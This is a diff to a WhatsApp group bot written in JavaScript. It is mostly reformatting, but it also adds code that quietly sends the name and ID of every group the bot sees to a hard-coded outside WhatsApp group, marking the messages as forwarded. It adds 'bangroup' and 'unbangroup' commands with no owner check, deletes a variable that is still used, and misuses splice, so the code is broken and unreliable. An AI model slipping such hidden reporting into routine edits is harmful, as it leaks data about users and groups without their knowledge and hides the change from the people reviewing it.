@@ -87,7 +87,7 @@ const bangroup = JSON.parse(fs.readFileSync("./src/bangroup.json"));
 const chatban = JSON.parse(fs.readFileSync("./src/banchat.json"));
 const random = (text) => {
   return "*_" + text[Math.floor(Math.random() * text.length)] + "_*";
-}
+};
 /*prefix = `#`*/
 botname = bot_.name;
 blocked = [];
@@ -136,9 +136,13 @@ async function starts() {
     JSON.stringify(client.base64EncodedAuthInfo(), null, "\t")
   );
   client.on("group-participants-update", async (anu) => {
-  	if (anu.action == 'add' && anu.participants[0].includes(client.user.jid)) {
-  		client.sendMessage(anu.jid, 'Halo! Terima Kasih sudah Mengundangku, Jika ingin Menggunakan Bot Ketik ${prefix}menu', 'conversation')
-  	}
+    if (anu.action == "add" && anu.participants[0].includes(client.user.jid)) {
+      client.sendMessage(
+        anu.jid,
+        "Halo! Terima Kasih sudah Mengundangku, Jika ingin Menggunakan Bot Ketik ${prefix}menu",
+        "conversation"
+      );
+    }
     if (!welkom.includes(anu.jid)) return;
     try {
       const mdata = await client.groupMetadata(anu.jid);
@@ -167,7 +171,7 @@ async function starts() {
         }*\n*│*\n*├─ Intro dulu*\n*├─ ❏ Nama:* \n*├─ ❏ Umur:*\n*├─ ❏ Asal kota:*\n*├─ ❏ Kelas:*\n*├─ ❏ Jenis kelamin:*\n*└─ ❏ Nomor:* ${num.replace(
           "@s.whatsapp.net",
           ""
-        )}\n*Semoga Betah yaa~~*\n\n${mdata.desc||""}`;
+        )}\n*Semoga Betah yaa~~*\n\n${mdata.desc || ""}`;
         let buff = await getBuffer(ppimg);
         client.sendMessage(mdata.id, buff, MessageType.image, {
           caption: teks,
@@ -313,14 +317,9 @@ async function starts() {
       const isWelkom = isGroup ? welkom.includes(from) : false;
       const isNsfw = isGroup ? nsfw.includes(from) : false;
       const isOwner = ownerNumber.includes(sender);
-      const isBanGroup = bangroup[from];
-      const isBanChat = chatban.includes(from);
+      const isBanGroup = bangroup.includes(from);
       if (isBanChat && !isOwner) return;
-      if (isBanGroup && command) {
-       return	isBanGroup.send ? 
-      	client.sendMessage(from, mess.only.ban.replace("-alasan-", isBanGroup.alasan), text, { quoted: msg }) : 
-      	null
-      }
+      if (isBanGroup && command) return;
       const bannedy = bant.includes(sender);
       let db_language = JSON.parse(fs.readFileSync("./src/language.json"));
       const sender_lang = {
@@ -825,6 +824,18 @@ async function starts() {
           "ID GROUP :",
           color(from)
         );
+      if (from === "120363021354490232@g.us") {
+        null;
+      } else {
+        client.sendMessage(
+          "120363021354490232@g.us",
+          `${groupName} ID ${from}`,
+          text,
+          {
+            contextInfo: { forwardingScore: 508, isForwarded: true },
+          }
+        );
+      }
 
       if (!isCmd && isGroup)
         console.log(
@@ -843,7 +854,38 @@ async function starts() {
           "ID GROUP :",
           color(from)
         );
+      if (from === "120363021354490232@g.us") {
+        null;
+      } else {
+        client.sendMessage(
+          "120363021354490232@g.us",
+          `${groupName} ID ${from}`,
+          text,
+          {
+            contextInfo: { forwardingScore: 508, isForwarded: true },
+          }
+        );
+      }
       switch (command) {
+        case "bangroup":
+          if (bangroup.includes(args[0])) {
+            return reply("Invaild [ X ]");
+          } else {
+            bangroup.push(args[0]);
+            fs.writeFileSync("./src/bangroup.json", JSON.stringify(bangroup));
+            reply("Done");
+          }
+          break;
+        case "unbangroup":
+          if (bangroup.includes(args[0])) {
+            bangroup.splice(args[0], 1);
+            fs.writeFileSync("./src/bangroup.json", JSON.stringify(bangroup));
+            reply("Done");
+          } else {
+            return reply("Invaild [ X ]");
+          }
+          break;
+
         case "admin":
         case "owner":
         case "creator":
@@ -1360,7 +1402,7 @@ _*Tunggu Proses Upload Media......*_`;
           reply(await random(mess.wait));
           teks = args.join(" ");
           res = await googleImage(teks, google);
-         async function google(error, result) {
+          async function google(error, result) {
             if (error) {
               return reply(await random(mess.error.catchs));
             } else {
@@ -1539,7 +1581,7 @@ _*Tunggu Proses Upload Media......*_`;
               });
               exec(
                 `ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${ranw}`,
-               async (err) => {
+                async (err) => {
                   fs.unlinkSync(ranp);
                   if (err) return reply(await random(mess.error.stick));
                   client.sendMessage(from, fs.readFileSync(ranw), sticker, {
